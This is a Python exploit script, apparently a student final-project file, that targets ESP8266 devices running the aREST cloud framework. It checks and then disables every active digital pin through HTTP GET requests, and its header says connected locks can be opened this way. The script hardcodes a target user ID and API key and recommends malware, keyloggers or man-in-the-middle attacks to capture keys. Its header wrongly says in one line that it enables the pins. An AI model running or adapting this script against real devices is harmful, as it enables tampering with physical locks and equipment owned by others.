# Author: Benjamin Schafer
# Date: 3/22/2019
# Written As Part Of CNA 473 Final Project
#
# This Script Is Capable Of Disabling All Pins On An ESP8266 MicroController
# That Is Running The AREST Cloud Framework And Through Said Pins Enabling/Disabled
# Devices (Including Locking Mechanisms!) Connected To Said Pins Depending on
# Whether The Attached Device is Active High Or Active Low
#
# AREST Can Operate With or Without API Key's In The MicroController Code.
# An API Key Is Supposed To Secure Your Usage Of The AREST Framework
#
# This Particular Script Requires Knowing The Target Username and API Key
# However Knowing The API Key Is Not Needed To Exploit The MicroController
# This Script Just Does It Faster, Should You Know The Key
#
# The API Key Can Be Captured Through Malware, Keyloggers, or MITM
# To Name A Few Options
#
# Else, Use The arestfullsetoff.py Script To Exploit Without The API Key
#
# This Script Enables All Pins Through HTTP GET Requests


import requests
import sys

AREST_URI = "https://cloud.arest.io/"
USER = '272925/'
DIGITAL = 'digital/'
DISABLE = '/0'
API_KEY = 'id?key=h3mcbz71juajak8x'
PIN_NO = 0
USER_URI = AREST_URI + USER
STATUS_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + API_KEY
PIN_STATUS = [False] * 19

print("API Key Set As: " + API_KEY[7:] )
print("You Are Targeting the Following URI: " + USER_URI  + " Is That Okay? Y/N")
OK = input()

if OK == 'n' or OK == 'N':
     sys.exit()

else:
    r = requests.get(USER_URI + API_KEY)
    RETURN_MESSAGE = r.content

    if RETURN_MESSAGE.decode('utf-8')[56] != 'f':
        print("\nThe Target Is Online And Ready For Exploitation\n")

        index = 0
        while index < len(PIN_STATUS):
            print("Testing Pin " + str(PIN_NO))
            r = requests.get(STATUS_URI)
            RETURN_MESSAGE = r.content
            if RETURN_MESSAGE.decode('utf-8')[16] == "0":
                PIN_STATUS[index] = True
            PIN_NO = PIN_NO + 1
            STATUS_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + API_KEY
            index = index + 1

        print("\n")

        index = 0
        while index < len(PIN_STATUS):
             if PIN_STATUS[index] == True:
                 print( "Pin " + str(index) + " Is Already Disabled, This Pin Will Be Skipped")
             else:
                 print("Pin " + str(index) + " Is Marked To Be Disabled")
             index = index + 1

        print("\n")

        PIN_NO = 0
        index = 0
        TARGET_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + DISABLE + API_KEY
        while index < len(PIN_STATUS):
            if PIN_STATUS[index] == False:
                r = requests.get(TARGET_URI)
                print("Disabling Pin " + str(index))
            index = index + 1
            PIN_NO = PIN_NO + 1
            TARGET_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + DISABLE + API_KEY
    else:
        print("The Target Is Offline")
        sys.exit()

